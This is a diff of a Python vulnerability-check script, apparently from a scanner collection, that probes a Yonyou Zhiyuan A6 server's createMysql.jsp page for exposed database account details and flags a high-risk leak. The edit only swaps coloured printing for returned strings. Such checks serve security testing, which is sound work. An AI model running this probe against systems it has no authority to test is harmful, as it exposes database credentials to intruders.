@@ -8,8 +8,8 @@ description: 用友致远A6 /yyoa/createMysql.jsp,/yyoa/ext/createMysql.jsp存�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class yonyou_createMysql_disclosure_BaseVerify:
     def __init__(self, url):
@@ -26,12 +26,12 @@ class yonyou_createMysql_disclosure_BaseVerify:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"root" in req.text or r"localhost" in req.text:
-                    cprint("[+]存在用友致远A6协同系统数据库账号泄露...(高危)\tpayload: "+vulnurl, "red")
+                    return "[+]存在用友致远A6协同系统数据库账号泄露...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = yonyou_createMysql_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
